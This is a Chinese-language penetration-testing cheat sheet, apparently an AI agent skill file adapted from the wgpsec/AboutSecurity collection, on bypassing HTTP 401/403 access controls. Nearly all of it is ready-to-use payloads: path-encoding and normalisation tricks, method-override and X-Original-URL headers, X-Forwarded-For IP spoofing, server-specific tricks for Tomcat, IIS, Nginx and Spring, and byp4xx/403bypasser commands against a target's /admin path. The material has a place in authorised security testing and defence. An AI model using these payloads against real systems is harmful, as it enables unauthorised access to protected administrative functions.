# 401-403-bypass

> 来源: wgpsec/AboutSecurity (auth) | 融合进 skill-web


# 401/403 绕过方法论

核心思路：反向代理/WAF 检查一种路径格式，但后端做了不同的路径规范化。

## 深入参考

- 路径操纵 Payload 完整列表 → [references/path-manipulation-payloads.md](references/path-manipulation-payloads.md)
- HTTP 方法/Header 绕过 → [references/method-header-bypass.md](references/method-header-bypass.md)
- 中间件特定绕过与组合攻击 → [references/middleware-combo-bypass.md](references/middleware-combo-bypass.md)

---

## 决策树

```
遇到 401/403？
├── 1. 路径操纵（成功率最高）
│   ├── /path/ → /PATH → /path%20 → /./path → //path
│   ├── /path;x → /path..;/ → /%2e/path → /path%00
│   └── 200？→ 绕过成功
├── 2. 方法绕过
│   ├── POST/PUT/PATCH/DELETE/OPTIONS/HEAD
│   ├── X-HTTP-Method-Override: PUT
│   └── PROPFIND/自定义方法
├── 3. Header 绕过
│   ├── X-Original-URL: /path（Nginx/IIS）
│   ├── X-Forwarded-For: 127.0.0.1（IP 白名单）
│   └── Referer/Origin/Host 伪造
├── 4. 协议绕过
│   └── HTTP/1.0
├── 5. 组合攻击
│   └── Method + Path + Header 三合一
├── 全部失败 → 其他思路
│   ├── 请求走私 → cache-poisoning-smuggling
│   ├── SSRF → ssrf-methodology
│   ├── IDOR → idor-methodology
│   └── 认证逻辑 → privilege-escalation-web
└── 自动化扫描 byp4xx / 403bypasser
```

---

## 快速参考 — 路径操纵要点

| 技巧 | 示例 |
|------|------|
| 尾部斜杠/点 | `/admin/`  `/admin/.` |
| 大小写 | `/Admin`  `/ADMIN` |
| URL 编码 | `/%61dmin`  `/admi%6e` |
| 双重编码 | `/%2561dmin` |
| Unicode 过长编码 | `/admi%C0%AE` |
| 点段/路径穿越 | `/./admin`  `//admin` |
| NULL 字节 | `/admin%00`  `/admin%00.json` |
| 路径参数 (Tomcat) | `/admin;foo`  `/;/admin` |
| 反斜杠 (IIS) | `/admin\` |

## 快速参考 — 方法/Header 要点

| 技巧 | 示例 |
|------|------|
| 方法切换 | `POST /admin`  `PUT /admin` |
| Method Override | `X-HTTP-Method-Override: PUT` |
| URL 重写 | `X-Original-URL: /admin` |
| IP 伪造 | `X-Forwarded-For: 127.0.0.1` |
| 协议降级 | `GET /admin HTTP/1.0` |

## 中间件速查

| 服务器 | 关键技巧 |
|---|---|
| **Apache** | `/admin/`(尾部斜杠), `/.admin`(点前缀) |
| **Nginx** | `/Admin`(大小写), `X-Original-URL` |
| **IIS/ASP.NET** | `/admin;.css`, `/admin\`, `/admin::$DATA` |
| **Tomcat/Java** | `/admin;foo`, `/admin..;/`, `/;/admin` |
| **Spring** | `/admin.anything`(旧版后缀匹配) |

> 完整 payload 列表见 references 文件


---

## REF: method-header-bypass

# HTTP 方法/Header 绕过
## 2. HTTP 方法绕过

### 2.1 直接更换方法

```
GET  /admin → 403
POST /admin → 200  ✓
PUT  /admin → 200  ✓
PATCH /admin → 200  ✓
DELETE /admin → 200  ✓
OPTIONS /admin → 200  ✓ (可能泄露 Allowed Methods)
HEAD /admin → 200  ✓ (确认可访问，无 body)
```

### 2.2 Method Override Header

代理按方法阻止，但后端读取 override header：

```http
GET /admin HTTP/1.1
X-HTTP-Method-Override: PUT

GET /admin HTTP/1.1
X-Method-Override: POST

POST /admin HTTP/1.1
_method=PUT  (POST body — Rails/Laravel)
```

### 2.3 自定义 / 无效方法

```
FOOBAR /admin HTTP/1.1     → 部分 ACL 只检查 GET/POST
PROPFIND /admin HTTP/1.1   → WebDAV 方法
```

---

## 3. Header 绕过

### 3.1 URL 重写 Header（Nginx/IIS）

```http
GET / HTTP/1.1
X-Original-URL: /admin

GET / HTTP/1.1
X-Rewrite-URL: /admin
```

代理看到 `GET /`（放行），后端路由到 `/admin`。

### 3.2 IP 伪造 Header（白名单绕过）

每个 header 尝试 `127.0.0.1`, `10.0.0.1`, `0.0.0.0`, `::1`：

```http
X-Forwarded-For | X-Real-IP | X-Originating-IP | X-Remote-IP
X-Remote-Addr | X-Client-IP | True-Client-IP | Cluster-Client-IP
X-ProxyUser-IP | Forwarded: for=127.0.0.1
```

IP 编码变体：`0177.0.0.1`（八进制）, `2130706433`（十进制）, `0x7f000001`（十六进制）

### 3.3 其他 Header

```http
Referer: https://target.com/admin
Origin: https://target.com
Host: localhost
X-Forwarded-Host: localhost
Content-Type: application/json
X-Requested-With: XMLHttpRequest
```

---

## 4. 协议版本绕过

```http
# HTTP/1.0（部分 ACL 只针对 HTTP/1.1）
GET /admin HTTP/1.0

# HTTP/0.9（极老，无 header）
GET /admin
```


---

## REF: middleware-combo-bypass

# 中间件特定绕过与组合攻击
## 5. 组合攻击

```http
POST / HTTP/1.1                          # method override + URL rewrite
X-Original-URL: /admin
X-HTTP-Method-Override: GET

GET /%61dmin HTTP/1.1                    # IP 伪造 + 路径编码
X-Forwarded-For: 127.0.0.1

GET /Admin HTTP/1.0                      # 协议 + 大小写 + IP 伪造
X-Forwarded-For: 127.0.0.1
```

---

## 6. 中间件特定绕过

| 服务器 | 关键技巧 |
|---|---|
| **Apache** | `/admin/`(尾部斜杠), `/.admin`(点前缀), `/admin%0d`(CR) |
| **Nginx** | `/Admin`(大小写), `X-Original-URL: /admin` |
| **IIS/ASP.NET** | `/admin;.css`(路径参数+扩展名), `/admin\`(反斜杠), `/admin::$DATA`(ADS) |
| **Tomcat/Java** | `/admin;foo`(路径参数), `/admin..;/`(穿越), `/;/admin` |
| **Spring** | `/admin.anything`(后缀匹配，旧版), `/admin/`(尾部斜杠) |

---

## 7. 自动化工具

```bash
# byp4xx — 综合 403 绕过扫描
./byp4xx.sh https://target.com/admin

# 403bypasser
python3 403bypasser.py -u https://target.com/admin
```

---

## 9. 速查 — Top 10 Payload

```http
GET /admin/     HTTP/1.1        # 尾部斜杠
GET /Admin      HTTP/1.1        # 大小写
GET /admin%20   HTTP/1.1        # 尾部空格
GET /./admin    HTTP/1.1        # 点段
GET //admin     HTTP/1.1        # 双斜杠
POST /admin     HTTP/1.1        # 方法切换
GET / HTTP/1.1                  # X-Original-URL
X-Original-URL: /admin
GET /admin HTTP/1.1             # IP 白名单
X-Forwarded-For: 127.0.0.1
GET /admin;.css HTTP/1.1        # IIS 路径参数
GET /admin..;/ HTTP/1.1         # Tomcat 绕过
```


---

## REF: path-manipulation-payloads

# 路径操纵 Payload
## 1.1 尾部斜杠 / 点

```
/admin      → 403
/admin/     → 200  ✓ (trailing slash)
/admin/.    → 200  ✓ (trailing dot)
```

## 1.2 大小写

```
/admin      → 403
/Admin      → 200  ✓
/ADMIN      → 200  ✓
/aDmIn      → 200  ✓
```

代理规则区分大小写但后端不区分时有效（常见于 Windows/IIS）。

## 1.3 URL 编码

```
/admin          → 403
/%61dmin        → 200  ✓ (编码 'a')
/admi%6e        → 200  ✓ (编码 'n')
/%61%64%6d%69%6e → 200  ✓ (全编码)
```

## 1.4 双重 URL 编码

```
/admin              → 403
/%2561dmin          → 200  ✓ (%25=%, 解码两次: %61→a)
/admin%252f         → 200  ✓
```

## 1.5 Unicode / UTF-8 过长编码

```
/admin          → 403
/admi%C0%AE     → 200  ✓ (overlong UTF-8 '.')
/%C0%AFadmin    → 200  ✓ (overlong '/')
```

## 1.6 点段 / 路径穿越

```
/admin          → 403
/./admin        → 200  ✓
//admin         → 200  ✓
/admin/./       → 200  ✓
/admin..;/      → 200  ✓ (Tomcat 路径参数)
```

## 1.7 NULL 字节

```
/admin          → 403
/admin%00       → 200  ✓
/admin%00.json  → 200  ✓
```

## 1.8 路径参数注入（Java/Tomcat）

```
/admin          → 403
/admin;foo=bar  → 200  ✓ (Tomcat 将 ; 视为路径参数)
/admin;         → 200  ✓
/;/admin        → 200  ✓
```

## 1.9 尾部特殊字符

```
/admin%20       /admin%09       /admin?
/admin.json     /admin.html     /admin/~
```

## 1.10 反斜杠（Windows/IIS）

```
/admin\    /admin\..\/    \..\admin
```

## 1.11 组合

```
///admin///    /./admin/./    /admin/..;/admin    /%2e/admin
```
